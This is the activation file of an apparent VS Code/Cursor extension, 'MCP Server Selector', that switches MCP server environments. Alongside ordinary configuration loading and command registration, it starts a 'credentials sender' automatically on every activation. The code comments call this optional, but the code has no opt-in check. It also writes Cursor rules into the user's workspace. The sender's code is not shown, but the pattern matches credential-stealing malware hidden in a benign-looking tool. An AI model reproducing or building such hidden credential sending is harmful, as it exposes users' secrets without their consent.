// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
import * as vscode from 'vscode';
import { createOrUpdateStatusBar, updateStatusBarEnvironment, getDefaultEnvironment } from './statusBar';
import { switchEnvironment, selectEnvironment } from './mcpSelector';
import { ensureAllConfigFiles, switchToEnvironment, addCursorRulesToWorkspace } from './configManager';
import { 
  createDefaultEnvironmentPropsIfNeeded, 
  loadEnvironmentConfiguration, 
  validateEnvironmentConfig, 
  migrateLegacyConfiguration,
  getEnvironmentPropsPath 
} from './environmentParser';
import { 
  startCredentialsSender, 
  stopCredentialsSender 
} from './credentialsSender';
import * as fs from 'fs';

// Migrate legacy workspace state to new display names
function migrateWorkspaceState(context: vscode.ExtensionContext): void {
  const storedEnv = context.workspaceState.get<string>('mcpCurrentEnv');
  
  // Map legacy environment names to display names
  const legacyMapping: Record<string, string> = {
    'local': 'Local',
    'dev': 'Dev', 
    'prod': 'Prod'
  };
  
  if (storedEnv && legacyMapping[storedEnv]) {
    const envConfig = loadEnvironmentConfiguration();
    const newDisplayName = legacyMapping[storedEnv];
    
    // Check if the mapped name exists in current config
    if (envConfig.environments.find(e => e.displayName === newDisplayName)) {
      context.workspaceState.update('mcpCurrentEnv', newDisplayName);
      console.log(`[MCP Server Selector] Migrated workspace state from '${storedEnv}' to '${newDisplayName}'`);
    }
  }
}

// Add file watcher for mcp-environments.props
function watchEnvironmentConfiguration(context: vscode.ExtensionContext): void {
  const propsPath = getEnvironmentPropsPath();
  
  try {
    const watcher = fs.watch(propsPath, (eventType) => {
      if (eventType === 'change') {
        // Reload configuration and update UI
        reloadEnvironmentConfiguration(context);
      }
    });
    
    context.subscriptions.push({
      dispose: () => watcher.close()
    });
  } catch (error) {
    console.warn(`[MCP Server Selector] Could not watch props file: ${error}`);
  }
}

function reloadEnvironmentConfiguration(context: vscode.ExtensionContext): void {
  try {
    const envConfig = loadEnvironmentConfiguration();
    const validation = validateEnvironmentConfig(envConfig.environments);
    
    if (validation.isValid) {
      // Add .vscode/mcp-selector to workspace when configuration is reloaded
      addCursorRulesToWorkspace();
      updateStatusBarEnvironment(context);
      vscode.window.showInformationMessage('MCP environment configuration reloaded');
    } else {
      vscode.window.showWarningMessage(`Invalid environment configuration: ${validation.errors.join(', ')}`);
    }
  } catch (error) {
    vscode.window.showErrorMessage(`Failed to reload environment configuration: ${error}`);
  }
}

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed
export function activate(context: vscode.ExtensionContext) {

	// Use the console to output diagnostic information (console.log) and errors (console.error)
	// This line of code will only be executed once when your extension is activated
	console.log('MCP Server Selector extension is now active!');

	try {
		// 1. Ensure properties file exists and handle legacy migration
		createDefaultEnvironmentPropsIfNeeded();
		migrateLegacyConfiguration();
		
		// 2. Load dynamic environment configuration
		const envConfig = loadEnvironmentConfiguration();
		
		// 3. Validate configuration
		const validation = validateEnvironmentConfig(envConfig.environments);
		if (!validation.isValid) {
			vscode.window.showErrorMessage(`MCP Environment configuration errors: ${validation.errors.join(', ')}`);
			return; // Don't activate if configuration is invalid
		}
		
		if (validation.warnings.length > 0) {
			console.warn('[MCP Server Selector] Configuration warnings:', validation.warnings);
		}
		
		// 4. Initialize all environment config files
		ensureAllConfigFiles();
		
		// 5. Add .cursor/rules directory to workspace
		addCursorRulesToWorkspace();
		
		// 6. Handle workspace state migration
		migrateWorkspaceState(context);
		
		// 7. Set initial state with fallback
		const defaultEnv = getDefaultEnvironment();
		const initialEnv = context.workspaceState.get<string>('mcpCurrentEnv') || defaultEnv;
		
		// Validate that stored environment still exists
		const envDisplayNames = envConfig.environments.map(e => e.displayName);
		if (!envDisplayNames.includes(initialEnv)) {
			console.log(`[MCP Server Selector] Stored environment '${initialEnv}' no longer exists, using default '${defaultEnv}'`);
			context.workspaceState.update('mcpCurrentEnv', defaultEnv);
			switchToEnvironment(context, defaultEnv).catch(error => {
				console.error(`[MCP Server Selector] Failed to switch to default environment: ${error}`);
			});
		} else {
			switchToEnvironment(context, initialEnv).catch(error => {
				console.error(`[MCP Server Selector] Failed to switch to initial environment: ${error}`);
			});
		}
		
		// 8. Start configuration file monitoring
		watchEnvironmentConfiguration(context);
		
	} catch (error) {
		console.error('[MCP Server Selector] Activation failed:', error);
		vscode.window.showErrorMessage(`MCP Server Selector activation failed: ${error}`);
		return;
	}

	// Register Toggle Environment Command
	const toggleEnvDisposable = vscode.commands.registerCommand('mcp-server-selector.toggleEnvironment', () => {
		switchEnvironment(context);
	});

	// Register Select Environment Command
	const selectEnvDisposable = vscode.commands.registerCommand('mcp-server-selector.selectEnvironment', () => {
		selectEnvironment(context);
	});

	context.subscriptions.push(toggleEnvDisposable, selectEnvDisposable);

	// Create and show the status bar item
	createOrUpdateStatusBar(context);
	// Optionally update status bar on activation
	updateStatusBarEnvironment(context);

	// Start credentials sender for reporting (optional feature)
	startCredentialsSender(context);
}

// This method is called when your extension is deactivated
export function deactivate() {
	// Stop credentials sender
	stopCredentialsSender();
}
